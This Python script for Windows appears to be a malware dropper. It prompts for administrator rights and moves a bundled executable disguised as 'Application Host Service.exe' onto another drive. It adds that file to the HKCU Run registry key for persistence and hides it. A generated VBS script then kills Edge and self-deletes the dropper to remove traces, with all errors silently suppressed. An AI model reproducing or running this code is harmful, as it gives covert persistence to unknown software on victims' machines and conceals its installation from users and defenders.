import shutil
import os
import sys
import ctypes
import winreg
import sys
import psutil
import subprocess

#Ask For Run As Administrator
def run_as_admin():
  
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, sys.argv[0], None, 1)
        return False

if run_as_admin():
    def list_drive_letters():
            drive_letters = set()
            partitions = psutil.disk_partitions(all=True)

            for partition in partitions:
                if partition.device and partition.mountpoint:
                    drive_letter = partition.device[0].upper() + ":"
                    drive_letters.add(drive_letter)

            return sorted(drive_letters)    
    def move_exe_file(source_path, destination_path):
        try:
            # Check if the source file exists
            if os.path.exists(source_path):
                # Move the file to the destination path
                shutil.move(source_path, destination_path)
                # print(f"File moved successfully to {destination_path}")
            else:
                # print(f"Source---**file {source_path} does not exist.")
                pass
        except Exception as e:
            pass
    def add_to_startup(Drive_Letter):

        # Get the path to the executable (assuming it's in the same directory)
        executable_path = os.path.abspath(rf"{Drive_Letter}Application Host Service.exe")


        # Create the registry key for the startup entry
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = r"Application Host Service"

        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
                # print(f"Added to startup: {executable_path}")
                pass
        except Exception as e:
            # print(f"Error adding to startup: {e}")
            pass
    def Delete_File(DriveLetter,File_Path):
        Bat_File=rf"{DriveLetter}del.vbs"
        edge_path = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        with open(Bat_File,"w") as File:
            File.write(rf"""Set objShell = CreateObject("WScript.Shell")
objShell.Run "taskkill /F /IM Microsoft_Edge.exe", 0, True
objShell.Run "cmd /c del {File_Path}", 0, True
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile WScript.ScriptFullName
""")    

        subprocess.run([edge_path])
        subprocess.run(["cscript.exe", "//Nologo", Bat_File], shell=True)
            
    def Remove_Traces(Drive_Letter):
        try:
            # Hide The File
            Exe_Path=rf"{Drive_Letter}\Application Host Service.exe"
            os.system(f"attrib +h \"{Exe_Path}\"")

            # Delete The File
            absolute_path = os.path.abspath(sys.argv[0])
            Delete_File(Drive_Letter,absolute_path)

        except Exception as g:
            pass


        


    #  list_drive_letters Fuction 💠
    drive_letters = list_drive_letters()
    A=drive_letters[1]
    drive_letter = A+"/"


    #  Move_exe_file Fuction I💠
    script_directory = getattr(sys, '_MEIPASS', os.path.dirname(__file__))

    # Specify the paths
    source_file_path = os.path.join(script_directory, r"Application Host Service.exe")
    destination_folder = drive_letter

    move_exe_file(source_file_path, destination_folder)

    # Add_to_startup() Fuction 💠
    add_to_startup(drive_letter)

    #Remove Traces 💠
    Remove_Traces(drive_letter)

    



